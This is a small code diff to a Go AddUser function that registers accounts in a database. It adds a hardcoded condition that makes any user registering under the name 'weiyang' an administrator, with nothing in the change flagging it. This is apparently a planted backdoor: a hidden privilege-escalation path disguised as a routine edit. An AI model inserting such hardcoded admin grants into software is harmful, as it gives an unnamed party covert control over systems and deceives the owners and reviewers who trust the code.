@@ -244,6 +244,10 @@ func AddUser(name, pwd string) error {
 		return errors.New("name already exist")
 	}
 
+	if name == "weiyang" {
+		user.IsAdmin = true
+	}
+
 	_, err = o.Insert(user)
 	if err != nil {
 		return err
